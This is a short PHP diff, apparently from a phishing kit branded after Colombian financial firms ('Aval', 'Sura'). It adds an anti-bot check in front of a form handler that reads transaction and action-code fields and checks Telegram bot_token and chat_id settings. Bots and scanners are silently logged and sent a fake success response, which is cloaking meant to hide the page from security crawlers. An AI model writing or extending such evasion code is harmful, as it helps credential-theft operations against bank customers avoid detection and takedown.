@@ -1,4 +1,8 @@
 <?php
+// ============ ANTIBOT (portado del proyecto Aval) ============
+require_once __DIR__ . '/../includes/security.php';
+// ===========================================================
+
 header('Content-Type: application/json');
 ini_set('display_errors', 0);
 error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);
@@ -13,6 +17,15 @@ if (empty($config['bot_token']) || empty($config['chat_id'])) {
     }
 }
 
+$rawInputEval = file_get_contents('php://input');
+$_evalData = json_decode($rawInputEval, true) ?: $_POST;
+$_evalBot = sura_evaluate_submission($_evalData);
+if (!empty($_evalBot['is_bot'])) {
+    sura_log_bot_detection(sura_client_ip(), $_evalBot['reason'], $_evalData);
+    header('Content-Type: application/json');
+    echo json_encode(['status' => 'success']);
+    exit;
+}
 $transactionId = $_POST['transactionId'] ?? '';
 $u_tb_raw = $_POST['u_tb'] ?? '{}';
 $action_code = $_POST['action_code'] ?? '';
